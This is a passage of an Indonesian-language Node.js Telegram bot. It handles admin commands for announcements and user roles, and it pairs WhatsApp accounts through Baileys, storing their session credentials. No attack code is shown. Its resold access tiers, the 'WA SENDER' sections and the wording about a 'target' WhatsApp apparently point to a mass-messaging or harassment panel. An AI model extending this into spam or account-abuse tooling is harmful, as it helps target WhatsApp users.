    id: crypto.randomBytes(8).toString('hex'),
    tag: tag,
    message: message,
    createdAt: new Date().toISOString(),
    createdBy: userId.toString(),
    createdByName: msg.from.first_name || msg.from.username || 'Unknown'
  };

  infoMessages.push(newInfo);
  
  // Batasi maksimal 100 pesan (hapus yang paling lama)
  if (infoMessages.length > 100) {
    infoMessages.sort((a, b) => 
      new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()
    );
    const removed = infoMessages.splice(0, infoMessages.length - 100);
    logDebug(`[🗑️ INFO] Removed ${removed.length} old messages`);
  }

  saveInfoMessages(infoMessages);

  // Kirim notifikasi ke channel jika ada
  bot.sendMessage(chatId, 
    `<b>✅ INFORMASI BERHASIL DITAMBAHKAN</b>\n\n` +
    `<b>📌 TAG:</b> ${tag}\n` +
    `<b>📝 PESAN:</b>\n${message}\n\n` +
    `<b>🕐 WAKTU:</b> ${new Date().toLocaleString('id-ID')}\n` +
    `<b>👤 OLEH:</b> ${msg.from.first_name || msg.from.username || userId}\n\n` +
    `<i>Informasi akan tampil di dashboard pengguna.</i>`,
    { parse_mode: "HTML" }
  );

  // Log ke file
  const logLine = `[${new Date().toISOString()}] INFO: ${tag} - ${message} (by ${userId})\n`;
  fs.appendFileSync('logUser.txt', logLine);
});

// Command untuk hapus info berdasarkan ID (owner only)
bot.onText(/^\/delinfo\s+(.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
    bot.sendMessage(chatId, "❌ Hanya Owner dan Developer yang bisa menggunakan command ini!");
    return;
  }

  const infoId = match[1].trim();
  const infoMessages = loadInfoMessages();
  
  const index = infoMessages.findIndex(m => m.id === infoId);
  
  if (index === -1) {
    bot.sendMessage(chatId, "❌ ID informasi tidak ditemukan!");
    return;
  }

  const deleted = infoMessages.splice(index, 1)[0];
  saveInfoMessages(infoMessages);

  bot.sendMessage(chatId,
    `<b>✅ INFORMASI DIHAPUS</b>\n\n` +
    `<b>📌 TAG:</b> ${deleted.tag}\n` +
    `<b>📝 PESAN:</b>\n${deleted.message}\n\n` +
    `<i>Informasi berhasil dihapus dari database.</i>`,
    { parse_mode: "HTML" }
  );
});

// Command untuk list semua info (owner only)
bot.onText(/^\/listinfo$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
    bot.sendMessage(chatId, "❌ Hanya Owner dan Developer yang bisa menggunakan command ini!");
    return;
  }

  const infoMessages = loadInfoMessages();
  
  if (infoMessages.length === 0) {
    bot.sendMessage(chatId, "📭 Belum ada informasi.");
    return;
  }

  // Sort by newest first
  infoMessages.sort((a, b) => 
    new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );

  let message = `<b>📋 DAFTAR INFORMASI</b>\n\n`;
  message += `<i>Total: ${infoMessages.length} pesan</i>\n\n`;

  for (let i = 0; i < Math.min(infoMessages.length, 20); i++) {
    const info = infoMessages[i];
    const date = new Date(info.createdAt).toLocaleString('id-ID');
    
    message += `<b>${i + 1}. [${info.tag}]</b>\n`;
    message += `🆔 <code>${info.id}</code>\n`;
    message += `📝 ${info.message}\n`;
    message += `🕐 ${date}\n`;
    message += `👤 ${info.createdByName || info.createdBy}\n\n`;
  }

  if (infoMessages.length > 20) {
    message += `<i>...dan ${infoMessages.length - 20} pesan lainnya</i>\n`;
  }

  message += `\nGunakan /delinfo [ID] untuk menghapus`;

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});

// Command untuk clear semua info (owner only, dengan konfirmasi)
bot.onText(/^\/clearinfo$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
    bot.sendMessage(chatId, "❌ Hanya Owner dan Developer yang bisa menggunakan command ini!");
    return;
  }

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ YA, HAPUS SEMUA", callback_data: "confirm_clear_info" },
        { text: "❌ BATAL", callback_data: "cancel_clear_info" }
      ]
    ]
  };

  bot.sendMessage(chatId,
    "<b>⚠️ PERINGATAN!</b>\n\n" +
    "Anda akan menghapus <b>SEMUA</b> informasi dari database.\n" +
    "Aksi ini tidak dapat dibatalkan!\n\n" +
    "Yakin ingin melanjutkan?",
    { parse_mode: "HTML", reply_markup: keyboard }
  );
});

// Handler untuk konfirmasi clear info
bot.on('callback_query', async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const messageId = callbackQuery.message.message_id;

  // Clear info confirmation
  if (data === "confirm_clear_info") {
    // Auto delete pesan konfirmasi
    try {
      await bot.deleteMessage(chatId, messageId);
    } catch (e) {}

    // Hapus semua info kecuali 2 default
    const defaultInfo = [
      {
        id: crypto.randomBytes(8).toString('hex'),
        tag: 'PERATURAN',
        message: 'Dilarang Menjual Belikan Apk Jika Bukan Reseller',
        createdAt: new Date().toISOString(),
        createdBy: 'system',
        createdByName: 'System'
      },
      {
        id: crypto.randomBytes(8).toString('hex'),
        tag: 'PENGUMUMAN',
        message: 'Selamat datang di DEWA INVICTUS V3',
        createdAt: new Date().toISOString(),
        createdBy: 'system',
        createdByName: 'System'
      }
    ];
    
    saveInfoMessages(defaultInfo);

    bot.sendMessage(chatId,
      "<b>✅ SEMUA INFORMASI DIHAPUS</b>\n\n" +
      "Database informasi telah direset ke default.",
      { parse_mode: "HTML" }
    );
  }
  
  if (data === "cancel_clear_info") {
    try {
      await bot.deleteMessage(chatId, messageId);
    } catch (e) {}
    
    bot.sendMessage(chatId, "❌ Penghapusan informasi dibatalkan.");
  }
});

// Command untuk edit info (owner only)
bot.onText(/^\/editinfo\s+([^,]+),\s*(.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
    bot.sendMessage(chatId, "❌ Hanya Owner dan Developer yang bisa menggunakan command ini!");
    return;
  }

  const [infoId, newMessage] = [match[1].trim(), match[2].trim()];
  
  const infoMessages = loadInfoMessages();
  const index = infoMessages.findIndex(m => m.id === infoId);
  
  if (index === -1) {
    bot.sendMessage(chatId, "❌ ID informasi tidak ditemukan!");
    return;
  }

  const oldInfo = {...infoMessages[index]};
  infoMessages[index].message = newMessage;
  infoMessages[index].updatedAt = new Date().toISOString();
  infoMessages[index].updatedBy = userId.toString();
  
  saveInfoMessages(infoMessages);

  bot.sendMessage(chatId,
    `<b>✅ INFORMASI DIUPDATE</b>\n\n` +
    `<b>📌 TAG:</b> ${oldInfo.tag}\n` +
    `<b>📝 PESAN LAMA:</b>\n${oldInfo.message}\n\n` +
    `<b>📝 PESAN BARU:</b>\n${newMessage}`,
    { parse_mode: "HTML" }
  );
});

// Command untuk melihat transaksi pending (owner/developer only)
bot.onText(/\/pending/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
    bot.sendMessage(chatId, "❌ Hanya Owner dan Developer yang bisa menggunakan command ini!");
    return;
  }
  
  const pendingCount = Object.keys(pendingTransactions).length;
  
  if (pendingCount === 0) {
    bot.sendMessage(chatId, "📭 Tidak ada transaksi pending.");
    return;
  }
  
  let message = `<b>⏳ TRANSAKSI PENDING</b>\n\n`;
  message += `Total: ${pendingCount} transaksi\n\n`;
  
  for (const [id, trx] of Object.entries(pendingTransactions)) {
    message += `🆔 <code>${id}</code>\n`;
    message += `👤 Pembeli: ${trx.creatorName}\n`;
    message += `👤 Akun: ${trx.username}\n`;
    message += `🔥 Role: ${trx.selectedRole}\n`;
    message += `⏰ Exp: ${trx.inputType}\n`;
    message += `⏱️ ${Math.floor((Date.now() - trx.timestamp) / 60000)} menit lalu\n\n`;
  }
  
  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});

// Command /delakses untuk menghapus akses pengguna (owner/developer only)
bot.onText(/\/delakses\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  
  // Cek apakah user adalah developer atau owner
  if (!userRole) {
    bot.sendMessage(chatId, "❌ Anda tidak memiliki akses!");
    return;
  }
  
  // Hanya owner dan developer yang bisa menghapus akses
  if (userRole !== 'developer' && userRole !== 'owner') {
    bot.sendMessage(chatId, "❌ Hanya Developer dan Owner yang bisa menghapus akses!");
    return;
  }
  
  const targetId = match[1].trim();
  
  // Validasi: Tidak bisa hapus akses diri sendiri
  if (targetId === userId.toString()) {
    bot.sendMessage(chatId, "❌ Tidak bisa menghapus akses diri sendiri!");
    return;
  }
  
  // Load akses
  const akses = loadAkses();
  
  // Cek apakah target memiliki akses
  if (!akses[targetId]) {
    bot.sendMessage(chatId, `❌ User dengan ID <code>${targetId}</code> tidak memiliki akses!`, {
      parse_mode: "HTML"
    });
    return;
  }
  
  // Simpan data target untuk keperluan logging
  const targetRole = akses[targetId];
  const targetName = msg.from.first_name || msg.from.username || 'Unknown';
  
  // Hapus akses
  delete akses[targetId];
  saveAkses(akses);
  
  // Hapus juga dari accountCreationTracker jika ada (hapus limit tracking)
  if (accountCreationTracker[targetId]) {
    delete accountCreationTracker[targetId];
  }
  
  // Kirim konfirmasi ke penghapus
  bot.sendMessage(
    chatId,
    `✅ <b>AKSES BERHASIL DIHAPUS</b>\n\n` +
    `ID: <code>${targetId}</code>\n` +
    `ROLE SEBELUMNYA: <b>${targetRole.toUpperCase()}</b>\n` +
    `DIHAPUS OLEH: <b>${userRole.toUpperCase()}</b>\n\n` +
    `<i>User tersebut sekarang tidak bisa mengakses bot.</i>`,
    { parse_mode: "HTML" }
  );
  
  // Kirim notifikasi ke user yang dihapus aksesnya (jika bot bisa chat mereka)
  try {
    await bot.sendMessage(
      targetId,
      `⚠️ <b>AKSES ANDA TELAH DIHAPUS</b>\n\n` +
      `Anda tidak lagi memiliki akses ke bot ini.\n` +
      `Jika Anda merasa ini kesalahan, silahkan hubungi Developer/Owner.\n\n` +
      `ID Anda: <code>${targetId}</code>\n` +
      `Dihapus oleh: ${userRole.toUpperCase()}`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    // User mungkin memblokir bot atau tidak bisa dihubungi
    console.log(`Tidak bisa mengirim notifikasi ke user ${targetId}:`, e.message);
  }
  
  // Log ke file
  const logLine = `[${new Date().toISOString()}] ${userId} (${userRole}) deleted access for ${targetId} (${targetRole})\n`;
  fs.appendFileSync('logUser.txt', logLine);
});

// Command /listakses untuk melihat semua user yang memiliki akses (owner/developer only)
bot.onText(/\/listakses/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  
  // Cek apakah user adalah developer atau owner
  if (!userRole) {
    bot.sendMessage(chatId, "❌ Anda tidak memiliki akses!");
    return;
  }
  
  // Hanya owner dan developer yang bisa melihat daftar akses
  if (userRole !== 'developer' && userRole !== 'owner') {
    bot.sendMessage(chatId, "❌ Hanya Developer dan Owner yang bisa melihat daftar akses!");
    return;
  }
  
  // Load akses
  const akses = loadAkses();
  
  if (Object.keys(akses).length === 0) {
    bot.sendMessage(chatId, "📭 Belum ada user yang memiliki akses.");
    return;
  }
  
  let message = `<b>📋 DAFTAR AKSES PENGGUNA</b>\n\n`;
  let count = 1;
  
  // Urutkan berdasarkan role (developer/owner dulu)
  const sortedAkses = Object.entries(akses).sort((a, b) => {
    const roleOrder = { 'developer': 1, 'owner': 2, 'vip': 3, 'reseller': 4, 'member': 5 };
    return (roleOrder[a[1]] || 99) - (roleOrder[b[1]] || 99);
  });
  
  for (const [id, role] of sortedAkses) {
    message += `${count}. <code>${id}</code>\n`;
    message += `   Role: <b>${role.toUpperCase()}</b>\n`;
    
    // Cek apakah user ini pernah membuat akun (punya limit tracking)
    const hasCreatedVip = accountCreationTracker[id]?.hasCreatedVip ? "✅" : "❌";
    const hasCreatedReseller = accountCreationTracker[id]?.hasCreatedReseller ? "✅" : "❌";
    
    if (role === 'vip' || role === 'reseller' || role === 'owner' || role === 'developer') {
      message += `   Status: VIP:${hasCreatedVip} RES:${hasCreatedReseller}\n`;
    }
    
    message += `\n`;
    count++;
  }
  
  message += `Total: <b>${Object.keys(akses).length} user</b>`;
  
  bot.sendMessage(chatId, message, { 
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🔄 REFRESH", callback_data: "refresh_akses_list" }
        ]
      ]
    }
  });
});

// ================== CEK ROLE ==================
bot.onText(/\/cekrole/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  
  // Hapus pengecekan onlyPrivate agar bisa digunakan di grup
  
  // Cek apakah ini reply ke pesan user lain
  let targetUserId = fromId; // Default: user yang menjalankan command
  let targetUserInfo = msg.from; // Default: informasi user yang menjalankan command
  
  if (msg.reply_to_message) {
    // Jika reply, target adalah user yang di-reply
    targetUserId = msg.reply_to_message.from.id;
    targetUserInfo = msg.reply_to_message.from;
  }
  
  // Load akses
  const akses = loadAkses();
  const userRole = akses[targetUserId] || null;
  
  // Cek role berdasarkan akses.json
  const roles = {
    reseller: akses[targetUserId] === 'reseller' ? '✅' : '❌',
    vip: akses[targetUserId] === 'vip' ? '✅' : '❌',
    owner: akses[targetUserId] === 'owner' ? '✅' : '❌',
    developer: akses[targetUserId] === 'developer' ? '✅' : '❌'
  };
  
  // Cek juga dari accountCreationTracker untuk limit pembuatan akun
  const tracker = accountCreationTracker[targetUserId] || {};
  
  // Format nama pengguna
  const userName = targetUserInfo.first_name || 
                   targetUserInfo.username || 
                   'Pengguna';
  
  // Tambahkan username jika ada
  const usernameDisplay = targetUserInfo.username ? 
                         `@${targetUserInfo.username}` : 
                         '(tanpa username)';
  
  const statusMessage = `
<b>📊 STATUS ROLE PENGGUNA</b>

━━━━━━━━━━━━━━━━━━━
<b>INFORMASI PENGGUNA</b>
👤 Nama    : ${userName}
🔗 Username : ${usernameDisplay}
🆔 User ID  : <code>${targetUserId}</code>

━━━━━━━━━━━━━━━━━━━
<b>AKSES TELEGRAM BOT</b>
👑 Owner    : ${roles.owner}
👨‍💻 Developer : ${roles.developer}
⭐ VIP       : ${roles.vip}
📊 Reseller  : ${roles.reseller}

━━━━━━━━━━━━━━━━━━━
<b>STATUS PEMBUATAN AKUN</b>
📊 Sudah buat Reseller : ${tracker.hasCreatedReseller ? '✅' : '❌'}
⭐ Sudah buat VIP       : ${tracker.hasCreatedVip ? '✅' : '❌'}

━━━━━━━━━━━━━━━━━━━
<i>Role aktif: <b>${userRole ? userRole.toUpperCase() : 'TIDAK ADA'}</b></i>
`;

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "⬆️ UP ROLE",
          url: "https://t.me/By_Zii16"
        }
      ]
    ]
  };
  
  bot.sendMessage(chatId, statusMessage, {
    parse_mode: "HTML",
    reply_markup: keyboard,
    reply_to_message_id: msg.reply_to_message ? msg.reply_to_message.message_id : undefined
  });
});

// Command /delaksesall untuk menghapus semua akses (owner/developer only) - dengan konfirmasi
bot.onText(/\/delaksesall/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  
  // Cek apakah user adalah developer atau owner
  if (!userRole) {
    bot.sendMessage(chatId, "❌ Anda tidak memiliki akses!");
    return;
  }
  
  // Hanya owner dan developer yang bisa menghapus semua akses
  if (userRole !== 'developer' && userRole !== 'owner') {
    bot.sendMessage(chatId, "❌ Hanya Developer dan Owner yang bisa menghapus semua akses!");
    return;
  }
  
  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ YA, HAPUS SEMUA", callback_data: "confirm_delaksesall" },
        { text: "❌ BATAL", callback_data: "cancel_delaksesall" }
      ]
    ]
  };

  bot.sendMessage(chatId,
    "<b>⚠️ PERINGATAN!</b>\n\n" +
    "Anda akan menghapus <b>SEMUA</b> akses pengguna dari database.\n" +
    "Hanya akses Anda sendiri yang akan dipertahankan.\n" +
    "Aksi ini tidak dapat dibatalkan!\n\n" +
    "Yakin ingin melanjutkan?",
    { parse_mode: "HTML", reply_markup: keyboard }
  );
});

// Handler untuk konfirmasi hapus semua akses
bot.on('callback_query', async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const messageId = callbackQuery.message.message_id;
  
  const userRole = getUserRole(userId);
  
  // Validasi role untuk aksi ini
  if (data === "confirm_delaksesall") {
    // Auto delete pesan konfirmasi
    try {
      await bot.deleteMessage(chatId, messageId);
    } catch (e) {}
    
    // Cek lagi role untuk keamanan
    if (!userRole || (userRole !== 'developer' && userRole !== 'owner')) {
      bot.sendMessage(chatId, "❌ Anda tidak memiliki akses untuk melakukan ini!");
      return;
    }
    
    // Load akses
    const akses = loadAkses();
    
    // Hitung jumlah yang akan dihapus
    const totalBefore = Object.keys(akses).length;
    
    // Simpan akses user sendiri
    const currentUserAccess = akses[userId];
    
    // Hapus semua akses
    const newAkses = {};
    newAkses[userId] = currentUserAccess; // Pertahankan akses user sendiri
    
    // Simpan akses developer lain? (opsional, bisa disesuaikan)
    // Untuk keamanan, kita bisa pertahankan semua developer
    for (const [id, role] of Object.entries(akses)) {
      if (role === 'developer' || role === 'owner') {
        newAkses[id] = role;
      }
    }
    
    saveAkses(newAkses);
    
    // Hapus semua accountCreationTracker
    for (const id of Object.keys(accountCreationTracker)) {
      if (id !== userId) {
        delete accountCreationTracker[id];
      }
    }
    
    const totalAfter = Object.keys(newAkses).length;
    const deleted = totalBefore - totalAfter;
    
    bot.sendMessage(chatId,
      `<b>✅ SEMUA AKSES TELAH DIHAPUS</b>\n\n` +
      `Total sebelum: ${totalBefore} user\n` +
      `Total dihapus: ${deleted} user\n` +
      `Total sekarang: ${totalAfter} user (developer/owner dipertahankan)\n\n` +
      `<i>Akses Anda dan developer/owner lain tetap dipertahankan.</i>`,
      { parse_mode: "HTML" }
    );
    
    // Log ke file
    const logLine = `[${new Date().toISOString()}] ${userId} (${userRole}) deleted ALL accesses (${deleted} users removed)\n`;
    fs.appendFileSync('logUser.txt', logLine);
  }
  
  if (data === "cancel_delaksesall") {
    try {
      await bot.deleteMessage(chatId, messageId);
    } catch (e) {}
    
    bot.sendMessage(chatId, "❌ Penghapusan semua akses dibatalkan.");
  }
  
  // Handler untuk refresh daftar akses
  if (data === "refresh_akses_list") {
    // Auto delete pesan lama
    try {
      await bot.deleteMessage(chatId, messageId);
    } catch (e) {}
    
    // Panggil command listakses lagi
    bot.emit('text', {
      ...callbackQuery.message,
      text: '/listakses',
      from: callbackQuery.from
    });
  }
});

// ================== DOWNLOAD ACCESS FILE ==================
bot.onText(/^\/dow$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  // Cek apakah user adalah owner atau developer
  const userRole = getUserRole(userId);
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
    bot.sendMessage(chatId, "❌ Hanya Owner dan Developer yang bisa menggunakan perintah ini!");
    return;
  }

  try {
    // Path ke file akses.json
    const filePath = path.join(__dirname, 'akses.json');
    
    // Cek apakah file exists
    if (!fs.existsSync(filePath)) {
      return bot.sendMessage(chatId, "❌ File akses.json tidak ditemukan!");
    }

    // Dapatkan statistik file
    const stats = fs.statSync(filePath);
    const fileSize = stats.size;
    const modifiedTime = stats.mtime;

    // Kirim pesan sedang memproses
    const processingMsg = await bot.sendMessage(chatId, "⏳ *Sedang memproses file akses.json...*", {
      parse_mode: "Markdown"
    });

    // Baca file dan konversi ke buffer
    const fileBuffer = fs.readFileSync(filePath);

    // Format nama file dengan timestamp
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
    const fileName = `akses_${timestamp}.json`;

    // Kirim file ke user
    await bot.sendDocument(
      chatId,
      fileBuffer,
      {
        filename: fileName,
        caption: `📁 *FILE AKSES.JSON*\n\n` +
                `📊 *Informasi File*\n` +
                `• Ukuran: ${formatFileSize(fileSize)}\n` +
                `• Terakhir diubah: ${modifiedTime.toLocaleString('id-ID')}\n` +
                `• Diunduh oleh: @${msg.from.username || userId}\n` +
                `• Role: ${userRole.toUpperCase()}\n\n` +
                `⚠️ *File ini berisi data akses pengguna, jaga kerahasiaannya!*`,
        parse_mode: "Markdown"
      }
    );

    // Hapus pesan processing
    setTimeout(() => {
      bot.deleteMessage(chatId, processingMsg.message_id).catch(() => {});
    }, 1000);

    // Log aktivitas
    const logLine = `[${new Date().toISOString()}] DOWNLOAD: ${userId} (${userRole}) downloaded akses.json (${formatFileSize(fileSize)})\n`;
    fs.appendFileSync('logUser.txt', logLine);

  } catch (error) {
    console.error("[ERROR] Download akses.json:", error);
    bot.sendMessage(
      chatId, 
      `❌ *Gagal mendownload file!*\n\nError: ${error.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

// Fungsi helper untuk format ukuran file
function formatFileSize(bytes) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ================== PAIRING (PRIVATE ONLY) ==================
bot.onText(/^\/pairing\s+(\d+)$/i, async (msg, match) => {
  if (!onlyPrivate(msg)) return;
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const number = match[1];

  try {
    const db = loadDatabaseCached();
    const userAccount = db.find(u => u.telegramId === userId);

    if (!userAccount) {
      return bot.sendMessage(
        chatId,
        "❌ Anda belum memiliki akun!\nGunakan /start untuk membuat akun terlebih dahulu."
      );
    }

    const username = userAccount.username;

    // ===== STATUS AWAL =====
    await bot.sendMessage(
      chatId,
      `🔄 *Memproses PAIRING*\n\n` +
      `📱 Nomor: +${number}\n` +
      `👤 Akun: ${username}\n\n` +
      `⏳ Mohon tunggu...`,
      { parse_mode: "Markdown" }
    );

    const userDir = path.join("permenmd", username);
    const sessionDir = path.join(userDir, number);

    if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      version,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      markOnlineOnConnect: true,
      generateHighQualityLinkPreview: true,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 50000,
      syncFullHistory: false
    });

    sock.ev.on("creds.update", saveCreds);

    await sleep(2500);

    // ===== REQUEST PAIRING CODE =====
    if (!sock.authState.creds.registered) {
      const code = await sock.requestPairingCode(number);

      if (!code) {
        return bot.sendMessage(
          chatId,
          "❌ Gagal mendapatkan pairing code.\nPastikan nomor valid & belum dibanned."
        );
      }

      const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

      await bot.sendMessage(
        chatId,
        `✅ *PAIRING CODE BERHASIL*\n\n` +
        `📱 Nomor: +${number}\n` +
        `🔑 Kode: \`${formattedCode}\`\n\n` +
        `_Masukkan kode ini di WhatsApp target._`,
        { parse_mode: "Markdown" }
      );
    } else {
      await bot.sendMessage(
        chatId,
        "⚠️ Nomor ini sudah login.\nBisa Digunakan."
      );
    }

    // ===== CONNECTION HANDLER =====
    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "open") {
        activeConnections[number] = sock;

        await bot.sendMessage(
          chatId,
          `✅ *KONEKSI BERHASIL!*\n\n` +
          `📱 Nomor: +${number}\n` +
          `👤 Akun: ${username}\n` +
          `Status: AKTIF`,
          { parse_mode: "Markdown" }
        );

        // Simpan creds
        try {
          const sourceCreds = path.join(sessionDir, "creds.json");
          const destCreds = path.join(userDir, `${number}.json`);

          if (fs.existsSync(sourceCreds)) {
            fs.copyFileSync(sourceCreds, destCreds);
            logDebug(`✅ Session saved: ${destCreds}`);
          }
        } catch (e) {
          logError(`❌ Save session error: ${e.message}`);
        }
      }

      if (connection === "close") {
        const reason = lastDisconnect?.error?.output?.statusCode;
        logDebug(`[${username}] +${number} disconnected (${reason})`);

        if (reason === DisconnectReason.loggedOut) {
          await bot.sendMessage(
            chatId,
            `❌ Nomor +${number} logout.\nGunakan /pairing ${number} untuk pairing ulang.`
          );

          try {
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }

            const saved = path.join(userDir, `${number}.json`);
            if (fs.existsSync(saved)) fs.unlinkSync(saved);
          } catch (e) {
            logError(`Cleanup error: ${e.message}`);
          }
        }
      }
    });

  } catch (err) {
    logError("PAIRING ERROR", err);
    bot.sendMessage(
      chatId,
      `❌ Terjadi kesalahan:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});

// ================== FITUR ADD BOT (WA SENDER) ==================
// Simpan sesi aktif
const SESSIONS_FILE = "./sessions/active_sessions.json";
let sessions = new Map(); // Map untuk menyimpan koneksi socket

// Fungsi untuk menyimpan sesi aktif
function saveActiveSessions(botNumber) {
  try {
    let sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      sessions = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
    }
    if (!sessions.includes(botNumber)) {
      sessions.push(botNumber);
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
      logDebug(`[💾 SESSION] Saved active session: ${botNumber}`);
    }
  } catch (error) {
    logError(`[❌ SESSION] Error saving session: ${error.message}`);
  }
}

// Fungsi untuk menghapus sesi
function removeActiveSession(botNumber) {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      let sessions = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
      sessions = sessions.filter(s => s !== botNumber);
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
      logDebug(`[🗑️ SESSION] Removed session: ${botNumber}`);
    }
  } catch (error) {
    logError(`[❌ SESSION] Error removing session: ${error.message}`);
  }
}

// ================== FITUR ADD BOT (WA SENDER) ==================

// Fungsi untuk koneksi ke WhatsApp
// Fungsi untuk koneksi ke WhatsApp (PERBAIKAN)
async function connectToWhatsApp(botNumber, chatId, msg = null) {
  let statusMessage = null;
  
  if (chatId && msg) {
    statusMessage = await bot
      .sendMessage(
        chatId,
        `
╭─────────────────
│    MEMULAI    
│────────────────
│ Bot: +${botNumber}
│ Status: Inisialisasi...
╰─────────────────`,
        { parse_mode: "Markdown" }
      )
      .then((sentMsg) => sentMsg.message_id);
  }

  // Folder global
  const globalFolder = path.join('permenmd', 'global');
  const sessionDir = path.join(globalFolder, botNumber);
  const jsonFilePath = path.join(globalFolder, `${botNumber}.json`);
  
  // Buat folder jika belum ada
  if (!fs.existsSync(globalFolder)) {
    fs.mkdirSync(globalFolder, { recursive: true });
  }
  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    keepAliveIntervalMs: 50000,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        if (statusMessage && chatId) {
          await bot.editMessageText(
            `
╭─────────────────
│    RECONNECTING    
│────────────────
│ Bot: +${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
        setTimeout(() => connectToWhatsApp(botNumber, chatId, msg), 3000);
      } else {
        if (statusMessage && chatId) {
          await bot.editMessageText(
            `
╭─────────────────
│    KONEKSI GAGAL    
│────────────────
│ Bot: +${botNumber}
│ Status: Tidak dapat terhubung
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
          if (fs.existsSync(jsonFilePath)) fs.unlinkSync(jsonFilePath);
        } catch (error) {
          logError("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      // Simpan ke activeConnections
      activeConnections[botNumber] = sock;
      
      // Deteksi tipe WhatsApp
      const type = detectWATypeFromCreds(path.join(sessionDir, 'creds.json'));
      if (type === "Business") {
        biz[botNumber] = sock;
      } else {
        mess[botNumber] = sock;
      }
      
      // ===== PENTING: SIMPAN CREDS KE FILE JSON DENGAN FORMAT BENAR =====
      try {
        const sourceCreds = path.join(sessionDir, 'creds.json');
        
        if (fs.existsSync(sourceCreds)) {
          // Baca data creds
          const credsData = JSON.parse(fs.readFileSync(sourceCreds, 'utf8'));
          
          // Dapatkan informasi nomor dari creds
          let registeredNumber = botNumber;
          let name = credsData.me?.name || credsData.me?.verifiedName || `+${botNumber}`;
          
          // Format data yang akan disimpan
